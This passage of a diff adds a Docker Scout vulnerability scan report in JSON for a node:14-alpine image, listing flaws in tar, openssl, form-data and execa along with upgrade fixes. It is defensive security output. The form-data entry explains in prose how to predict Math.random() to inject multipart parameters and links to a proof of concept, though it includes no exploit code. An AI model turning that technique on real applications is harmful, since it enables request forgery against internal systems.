+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-23950",
+          "value": "CVE-2026-23950",
+          "url": "https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3"
+        }
+      ]
+    },
+    {
+      "id": "6d587e8036925cc5ee3ed5a95f211bce2d5dd3424ec9429c7a2c0e6c03e01405",
+      "category": "container_scanning",
+      "message": "CVE-2024-5535 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-5535",
+      "severity": "Critical",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.14-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-5535",
+          "value": "CVE-2024-5535",
+          "url": "https://scout.docker.com/v/CVE-2024-5535?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-5535?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
+        }
+      ]
+    },
+    {
+      "id": "ed34dbfd8831ff931e576b098b619a80e08cbb17ae7dd46ae954635d512a7670",
+      "category": "container_scanning",
+      "message": "CVE-2025-7783 on form-data@2.3.3",
+      "description": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+      "cve": "CVE-2025-7783",
+      "severity": "Critical",
+      "confidence": "Unknown",
+      "solution": "Upgrade form-data@2.3.3 to 2.5.4",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/form-data@2.3.3"
+          },
+          "version": "2.3.3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-7783",
+          "value": "CVE-2025-7783",
+          "url": "https://scout.docker.com/v/CVE-2025-7783?s=github&n=form-data&t=npm&vr=%3C2.5.4"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-7783?s=github&n=form-data&t=npm&vr=%3C2.5.4"
+        }
+      ]
+    },
+    {
+      "id": "5c22e5220215a6eff530cadbd9fab33430d060972085e780604d93dc178e9b0b",
+      "category": "container_scanning",
+      "message": "GMS-2020-2 on execa@0.7.0",
+      "description": "Attackers could trick execa into executing arbitrary binaries. This behaviour is caused by the setting `preferLocal=true` which makes execa search for locally installed binaries and executes them. This vulnerability is usually only exploitable when using execa on a client-side LOCAL application.",
+      "cve": "GMS-2020-2",
+      "severity": "Critical",
+      "confidence": "Unknown",
+      "solution": "Upgrade execa@0.7.0 to 2.0.0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/execa@0.7.0"
+          },
+          "version": "0.7.0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "GMS-2020-2",
+          "value": "GMS-2020-2",
+          "url": "https://scout.docker.com/v/GMS-2020-2?s=gitlab&n=execa&t=npm&vr=%3C2.0.0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/GMS-2020-2?s=gitlab&n=execa&t=npm&vr=%3C2.0.0"
+        }
+      ]
+    }
+  ],
+  "remediations": [],
+  "scan": {
+    "start_time": "2026-04-12T00:56:32",
+    "end_time": "2026-04-12T00:56:32",
+    "status": "success",
+    "type": "container_scanning",
+    "scanner": {
+      "id": "docker-scout",
+      "name": "Docker Scout",
+      "version": "1.19.0",
+      "vendor": {
+        "name": "Docker"
+      }
+    },
+    "analyzer": {
+      "id": "docker-scout",
+      "name": "Docker Scout",
+      "version": "1.19.0",
+      "vendor": {
+        "name": "Docker"
+      }
+    }
+  }
+}
